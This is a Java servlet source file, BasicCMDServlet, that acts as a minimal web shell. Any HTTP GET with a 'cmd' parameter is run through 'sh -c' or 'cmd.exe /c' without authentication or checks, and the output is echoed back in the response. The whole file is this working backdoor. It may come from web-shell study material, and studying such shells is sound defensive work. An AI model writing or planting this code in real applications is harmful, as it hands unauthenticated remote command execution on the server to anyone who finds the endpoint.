package com.summer233;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

@WebServlet(name = "BasicCMDServlet", urlPatterns = "/basicCMDServlet")
public class BasicCMDServlet extends HttpServlet {
	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		resp.setContentType("text/html; charset=UTF-8");
		resp.setCharacterEncoding("UTF-8");
		resp.getWriter().println("this is a SummerCMDServlet<br>");
		if (req.getParameter("cmd") != null) {
			boolean isLinux = true;
			String osTyp = System.getProperty("os.name");
			if (osTyp != null && osTyp.toLowerCase().contains("win")) {
				isLinux = false;
			}
			String[] cmds = isLinux ? new String[] { "sh", "-c", req.getParameter("cmd") }
					: new String[] { "cmd.exe", "/c", req.getParameter("cmd") };
			InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
			Scanner s = new Scanner(in).useDelimiter("\\a");
			String output = s.hasNext() ? s.next() : "";
			resp.getWriter().write(output);
			resp.getWriter().flush();
			resp.getWriter().close();
		}
	}
}